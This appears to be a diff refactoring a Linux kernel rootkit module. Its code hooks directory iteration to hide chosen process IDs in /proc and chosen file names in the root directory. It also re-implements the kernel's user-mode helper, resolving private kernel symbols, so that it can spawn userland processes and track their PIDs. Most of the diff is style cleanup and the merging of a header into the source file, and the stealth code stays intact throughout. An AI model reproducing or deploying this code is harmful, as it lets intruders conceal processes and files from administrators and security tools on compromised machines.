@@ -1,32 +1,15 @@
-#ifndef PROC_FS_HIDE_H
-#define PROC_FS_HIDE_H
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <linux/kmod.h>
+#include <linux/string.h>
+#include <linux/spinlock.h>
+#include <linux/kallsyms.h>
+#include <linux/fs.h>
+#include <linux/err.h>
 
-struct hidden_proc
-{
-    pid_t pid;
-    struct list_head list;
-};
-
-struct hidden_file
-{
-    char *name;
-    struct list_head list;
-};
-
-struct n_subprocess_info
-{
-    struct work_struct work;
-    struct completion *complete;
-    char *path;
-    char **argv;
-    char **envp;
-    int wait;
-    int retval;
-    int (*init)(struct subprocess_info *info);
-    void (*cleanup)(struct subprocess_info *info);
-    void *data;
-    pid_t pid;
-};
+#include "../include/syscall_table.h"
+#include "../include/proc_fs_hide.h"
 
 LIST_HEAD(hidden_procs);
 LIST_HEAD(hidden_files);
@@ -39,46 +22,10 @@ static DEFINE_SPINLOCK(hidden_files_lock);
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 
-static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
-static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
+int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
+int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 
-static int callmodule_pid;
-
-struct n_subprocess_info *n_call_usermodehelper_setup(char *path, char **argv,
-        char **envp, gfp_t gfp_mask);
-
-static inline int n_call_usermodehelper_fns(char *path, char **argv, char **envp,
-        int wait,
-        int (*init)(struct subprocess_info *info),
-        void (*cleanup)(struct subprocess_info *), void *data)
-{
-    struct subprocess_info *info;
-    struct n_subprocess_info *n_info;
-    gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;
-    int ret;
-
-    populate_rootfs_wait();
-
-    n_info = n_call_usermodehelper_setup(path, argv, envp, gfp_mask);
-    info = (struct subprocess_info *) n_info;
-
-    if (info == NULL)
-        return -ENOMEM;
-
-    call_usermodehelper_setfns(info, init, cleanup, data);
-    ret = call_usermodehelper_exec(info, wait);
-    callmodule_pid = n_info->pid;
-
-
-    return ret;
-}
-
-static inline int n_call_usermodehelper(char *path, char **argv, char **envp, int wait)
-{
-    return n_call_usermodehelper_fns(path, argv, envp, wait,
-                                     NULL, NULL, NULL);
-}
-
+int callmodule_pid;
 
 static void n__call_usermodehelper(struct work_struct *work)
 {
@@ -91,8 +38,8 @@ static void n__call_usermodehelper(struct work_struct *work)
     int (*ptrwait_for_helper)(void *data);
     int (*ptr____call_usermodehelper)(void *data);
 
-    ptrwait_for_helper = (void*)kallsyms_lookup_name("wait_for_helper");
-    ptr____call_usermodehelper = (void*)kallsyms_lookup_name("____call_usermodehelper");
+    ptrwait_for_helper = (void *)kallsyms_lookup_name("wait_for_helper");
+    ptr____call_usermodehelper = (void *)kallsyms_lookup_name("____call_usermodehelper");
 
     sub_info = (struct subprocess_info *)n_sub_info;
 
@@ -106,8 +53,7 @@ static void n__call_usermodehelper(struct work_struct *work)
     callmodule_pid = pid;
     n_sub_info->pid = pid;
 
-    switch (wait)
-    {
+    switch (wait) {
     case UMH_NO_WAIT:
         call_usermodehelper_freeinfo(sub_info);
         break;
@@ -122,11 +68,11 @@ static void n__call_usermodehelper(struct work_struct *work)
     }
 }
 
-
 struct n_subprocess_info *n_call_usermodehelper_setup(char *path, char **argv,
         char **envp, gfp_t gfp_mask)
 {
     struct n_subprocess_info *sub_infoB;
+
     sub_infoB = kzalloc(sizeof(struct n_subprocess_info), gfp_mask);
     if (!sub_infoB)
         return sub_infoB;
@@ -139,25 +85,45 @@ struct n_subprocess_info *n_call_usermodehelper_setup(char *path, char **argv,
     return sub_infoB;
 }
 
+int n_call_usermodehelper(char *path, char **argv, char **envp, int wait)
+{
+    struct subprocess_info *info;
+    struct n_subprocess_info *n_info;
+    gfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;
+    int ret;
 
+    populate_rootfs_wait();
 
-static int n_root_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+    n_info = n_call_usermodehelper_setup(path, argv, envp, gfp_mask);
+    info = (struct subprocess_info *)n_info;
+
+    if (info == NULL)
+        return -ENOMEM;
+
+    call_usermodehelper_setfns(info, NULL, NULL, NULL);
+    ret = call_usermodehelper_exec(info, wait);
+    callmodule_pid = n_info->pid;
+
+    return ret;
+}
+
+static int n_root_filldir(void *__buf, const char *name, int namelen,
+                          loff_t offset, u64 ino, unsigned d_type)
 {
     struct hidden_file *hf;
 
     spin_lock(&hidden_files_lock);
-    list_for_each_entry ( hf, &hidden_files, list )
-    if ( ! strcmp(name, hf->name) )
-    {
-        spin_unlock(&hidden_files_lock);
-        return 0;
-    }
+    list_for_each_entry(hf, &hidden_files, list)
+        if (!strcmp(name, hf->name)) {
+            spin_unlock(&hidden_files_lock);
+            return 0;
+        }
     spin_unlock(&hidden_files_lock);
 
     return root_filldir(__buf, name, namelen, offset, ino, d_type);
 }
 
-int n_root_iterate ( struct file *file, void *dirent, filldir_t filldir )
+int n_root_iterate(struct file *file, void *dirent, filldir_t filldir)
 {
     int ret;
 
@@ -171,26 +137,26 @@ int n_root_iterate ( struct file *file, void *dirent, filldir_t filldir )
     return ret;
 }
 
-static int n_proc_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+static int n_proc_filldir(void *__buf, const char *name, int namelen,
+                          loff_t offset, u64 ino, unsigned d_type)
 {
     struct hidden_proc *hp;
     int pid;
 
     if (kstrtoint(name, 10, &pid) == 0) {
         spin_lock(&hidden_procs_lock);
-        list_for_each_entry ( hp, &hidden_procs, list )
-        if ( pid == hp->pid )
-        {
-            spin_unlock(&hidden_procs_lock);
-            return 0;
-        }
+        list_for_each_entry(hp, &hidden_procs, list)
+            if (pid == hp->pid) {
+                spin_unlock(&hidden_procs_lock);
+                return 0;
+            }
         spin_unlock(&hidden_procs_lock);
     }
 
     return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
 
-int n_proc_iterate ( struct file *file, void *dirent, filldir_t filldir )
+int n_proc_iterate(struct file *file, void *dirent, filldir_t filldir)
 {
     int ret;
 
@@ -204,12 +170,12 @@ int n_proc_iterate ( struct file *file, void *dirent, filldir_t filldir )
     return ret;
 }
 
-void *get_vfs_iterate ( const char *path )
+void *get_vfs_iterate(const char *path)
 {
     void *ret;
     struct file *filep;
 
-    if ( IS_ERR(filep = filp_open(path, O_RDONLY, 0)) )
+    if (IS_ERR(filep = filp_open(path, O_RDONLY, 0)))
         return NULL;
 
     ret = filep->f_op->readdir;
@@ -218,12 +184,12 @@ void *get_vfs_iterate ( const char *path )
     return ret;
 }
 
-void hide_file ( char *name )
+void hide_file(char *name)
 {
     struct hidden_file *hf;
 
     hf = kmalloc(sizeof(*hf), GFP_KERNEL);
-    if ( ! hf )
+    if (!hf)
         return;
     hf->name = name;
 
@@ -232,15 +198,13 @@ void hide_file ( char *name )
     spin_unlock(&hidden_files_lock);
 }
 
-void unhide_file ( char *name )
+void unhide_file(char *name)
 {
     struct hidden_file *hf;
 
     spin_lock(&hidden_files_lock);
-    list_for_each_entry ( hf, &hidden_files, list )
-    {
-        if ( !strcmp(name, hf->name) )
-        {
+    list_for_each_entry(hf, &hidden_files, list) {
+        if (!strcmp(name, hf->name)) {
             list_del(&hf->list);
             kfree(hf->name);
             kfree(hf);
@@ -251,12 +215,12 @@ void unhide_file ( char *name )
     spin_unlock(&hidden_files_lock);
 }
 
-void hide_proc ( pid_t pid )
+void hide_proc(pid_t pid)
 {
     struct hidden_proc *hp;
 
     hp = kmalloc(sizeof(*hp), GFP_KERNEL);
-    if ( ! hp )
+    if (!hp)
         return;
     hp->pid = pid;
 
@@ -265,15 +229,13 @@ void hide_proc ( pid_t pid )
     spin_unlock(&hidden_procs_lock);
 }
 
-void unhide_proc ( pid_t pid )
+void unhide_proc(pid_t pid)
 {
     struct hidden_proc *hp;
 
     spin_lock(&hidden_procs_lock);
-    list_for_each_entry ( hp, &hidden_procs, list )
-    {
-        if ( pid == hp->pid )
-        {
+    list_for_each_entry(hp, &hidden_procs, list) {
+        if (pid == hp->pid) {
             list_del(&hp->list);
             kfree(hp);
             spin_unlock(&hidden_procs_lock);
@@ -282,5 +244,3 @@ void unhide_proc ( pid_t pid )
     }
     spin_unlock(&hidden_procs_lock);
 }
-
-#endif /* PROC_FS_HIDE_H */
